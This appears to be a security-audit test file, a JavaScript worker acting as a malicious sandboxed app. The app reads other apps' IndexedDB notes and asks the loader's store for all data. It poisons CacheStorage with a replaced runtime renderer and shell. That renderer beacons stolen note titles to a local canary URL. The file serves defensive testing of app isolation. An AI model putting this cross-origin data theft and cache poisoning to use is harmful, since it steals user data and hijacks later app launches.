// Audit only: a malicious Strict-runtime app. It declares no network access and passes
// verification. From its worker it (1) reads another app's database if they share an origin,
// and (2) overwrites the PWX runtime in CacheStorage, so the NEXT launch on this origin runs a
// renderer without the allowlist and a shell without CSP. CacheStorage isn't network, so
// connect-src 'none' doesn't stop it. (No eval: the worker's CSP forbids it.)
const CANARY = "http://127.0.0.1:8199";
async function readNotes() {
  const titles = [];
  for (const [name, storeName] of [["pwx-notes", "notes"], ["pwx-app-store", "kv"]]) {
    try {
      const db = await new Promise((ok, no) => { const r = indexedDB.open(name); r.onsuccess = () => ok(r.result); r.onerror = no; });
      if (!db.objectStoreNames.contains(storeName)) continue;
      const all = await new Promise((ok) => { const q = db.transaction(storeName).objectStore(storeName).getAll(); q.onsuccess = () => ok(q.result); });
      for (const n of all) if (n && n.title) titles.push(n.title);
    } catch (e) { titles.push("error:" + (e && e.name)); }
  }
  // Sealed apps (Quarantine Part 1): data is kept by the loader. Ask it for everything, as an app
  // that declares storage may; the loader must answer with this app's data only.
  try {
    if (self.PwxUI && self.PwxUI.store) for (const n of await self.PwxUI.store.all()) if (n && n.title) titles.push(n.title);
  } catch (e) { titles.push("store-error:" + (e && e.message)); }
  return titles.join("|") || "none";
}
const POISONED_RENDERER = `(async () => {
  const titles = await (${readNotes.toString()})();
  const img = new Image(); img.src = "${CANARY}/leak/poisoned-runtime?d=" + encodeURIComponent(titles);
  document.documentElement.append(img);
})();`;
const POISONED_SHELL = `<!doctype html><html><head><script src="/__pwx/renderer.js"></script></head><body></body></html>`;

let id = 1;
const say = (text) => { const n = id++; postMessage({ ops: [{ t: "create", id: n, tag: "h1" }, { t: "text", id: n, value: text }, { t: "append", parent: 0, id: n }] }); };

onmessage = async (e) => {
  if (e.data?.t !== "init") return;
  const stolen = await readNotes();
  let poisoned = "POISONED";
  try {
    const cache = await caches.open("pwx-runtime-v1");
    await cache.put("/__pwx/renderer.js", new Response(POISONED_RENDERER, { headers: { "Content-Type": "text/javascript" } }));
    await cache.put("/__pwx/strict.html", new Response(POISONED_SHELL, { headers: { "Content-Type": "text/html" } }));
  } catch (e) { poisoned = "no cache: " + (e && e.name); }
  say(`STOLEN: ${stolen}`);
  say(poisoned);
};
